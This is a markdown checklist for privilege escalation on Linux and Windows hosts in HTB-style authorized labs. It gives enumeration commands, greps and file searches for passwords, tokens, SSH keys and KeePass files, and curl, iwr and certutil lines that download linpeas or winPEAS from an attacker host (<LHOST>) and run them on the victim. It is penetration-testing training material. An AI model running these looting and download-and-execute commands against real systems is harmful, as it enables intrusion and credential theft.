# HTB Post-Foothold Privilege Escalation Tactics

This checklist is for authorized lab targets (HTB-style environments) after initial access.

## Workflow Order

1. Capture baseline host/user context.
2. Run quick manual checks for obvious privilege escalation paths.
3. Run automation (`linpeas`/`winpeas`) and validate findings manually.
4. Prioritize low-noise, high-confidence escalation paths.
5. Document proof and cleanup notes.

---

## Linux Privilege Escalation Tactics

## 1) Baseline Context

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
sudo -l
```

What to look for:
- Group memberships (`docker`, `lxd`, `adm`, `disk`, etc.)
- `sudo` entries with `NOPASSWD`
- Old kernel versions

## 2) Sudo and Misconfigured Binaries

```bash
sudo -l
```

- If any binary is allowed via sudo, check GTFOBins for escalation patterns.
- Check wildcard/path abuse in sudo rules.

Reference:
- https://gtfobins.github.io/

## 3) SUID/SGID and File Capabilities

```bash
find / -xdev -type f -perm -4000 2>/dev/null
find / -xdev -type f -perm -2000 2>/dev/null
getcap -r / 2>/dev/null
```

What to look for:
- Unusual custom binaries with SUID
- Interpreters/utilities with exploitable capabilities

## 4) Writable Paths and Service Abuse

```bash
find / -xdev -type d -writable 2>/dev/null
find /etc /opt /usr/local -xdev -type f -writable 2>/dev/null
```

Check for:
- Writable scripts executed by root (cron/systemd)
- Writable service unit files or startup scripts
- PATH hijacking opportunities

## 5) Cron, Timers, and Startup Jobs

```bash
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

Look for:
- Jobs running as root with writable scripts/paths
- Weak file permissions in scheduled scripts

## 6) Credentials and Secrets Reuse

```bash
grep -RInE "password|passwd|secret|token|api[_-]?key" /home /opt /var/www /etc 2>/dev/null
find /home /root -maxdepth 4 -type f \( -name "*.env" -o -name "*.conf" -o -name "*.ini" -o -name "id_rsa" -o -name "*.kdbx" \) 2>/dev/null
```

Look for:
- DB/application creds
- SSH keys
- Reused sudo/su credentials

## 7) Containers and Virtualization Escape Angles

```bash
id
groups
ls -la /var/run/docker.sock 2>/dev/null
```

Check:
- Membership in `docker`/`lxd`
- Access to container runtime sockets

## 8) NFS and Mounted Filesystem Issues

```bash
mount
cat /etc/exports 2>/dev/null
showmount -e 127.0.0.1 2>/dev/null
```

Look for:
- `no_root_squash`
- Writable mounts usable for privilege boundary crossing

## 9) Run LINPEAS

If already staged with your tooling:

```bash
deploy-privesc --tool linpeas --quiet command --cmd-platform linux --cmd-tool linpeas
```

Manual transfer/run example:

```bash
# attacker
host-payload . --file linpeas.sh

# victim
curl -fsSL http://<LHOST>:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

Then parse/output-track:

```bash
loot-parse /tmp/linpeas.out --summary-only
```

---

## Windows Privilege Escalation Tactics

## 1) Baseline Context

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```

PowerShell:

```powershell
Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture
```

What to look for:
- Dangerous privileges (`SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`)
- Local admin group membership
- Patch/build level clues

## 2) Local Users, Groups, and Sessions

```cmd
net user
net localgroup
net localgroup administrators
query user
```

Look for:
- High-privileged local/domain accounts
- Sessions you may be able to leverage

## 3) Service Misconfigurations

```cmd
wmic service get name,displayname,pathname,startmode,state
sc qc <service_name>
```

Look for:
- Unquoted service paths
- Writable service binaries/directories
- Weak service ACLs

## 4) Scheduled Tasks and Autoruns

```cmd
schtasks /query /fo LIST /v
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

Look for:
- Tasks/binaries running as SYSTEM with writable paths
- Weak autorun targets

## 5) Credential and Config Loot

```cmd
cmdkey /list
dir C:\unattend.xml /s /b
dir C:\Windows\Panther\Unattend.xml /s /b
```

PowerShell search:

```powershell
Get-ChildItem -Path C:\Users,C:\inetpub,C:\ProgramData -Recurse -ErrorAction SilentlyContinue -Include *.config,*.xml,*.ini,*.txt |
  Select-String -Pattern 'password|secret|token|connection string' -ErrorAction SilentlyContinue
```

## 6) Network/AD-Adjacent Checks

```cmd
ipconfig /all
route print
net use
```

Check for:
- Accessible admin shares
- Domain context and reachable management hosts

## 7) Run WINPEAS

If staged with your tooling:

```bash
deploy-privesc --tool winpeas --quiet command --cmd-platform windows --cmd-tool winpeas
```

Manual transfer/run examples:

```powershell
# victim
powershell -c "iwr -UseBasicParsing http://<LHOST>:8000/winPEASx64.exe -OutFile C:\Windows\Temp\winPEASx64.exe"
C:\Windows\Temp\winPEASx64.exe > C:\Windows\Temp\winpeas.out
```

Alternative with certutil:

```cmd
certutil -urlcache -split -f http://<LHOST>:8000/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe
C:\Windows\Temp\winPEASx64.exe > C:\Windows\Temp\winpeas.out
```

Then collect output for parsing/notes.

---

## Prioritization Heuristics

Prioritize in this order:

1. Direct privilege grants (`sudo NOPASSWD`, local admin memberships, dangerous token privileges).
2. Writable execution paths as root/SYSTEM (services, tasks, startup scripts).
3. High-value credential material (plaintext secrets, reusable hashes/tokens/keys).
4. Kernel/OS exploit opportunities (after misconfig checks).

## Post-Escalation Checklist

- Confirm privilege level:
  - Linux: `id`
  - Windows: `whoami /groups`
- Capture proof files and key context.
- Re-run looting with elevated access (`loot-linux.sh` / `loot-windows.ps1`).
- Update credential store and findings:

```bash
loot-parse .
creds import-loot parsed
```

## Notes

- Keep exploitation actions deliberate and reversible where possible.
- Avoid destructive behavior unless explicitly part of the lab objective.
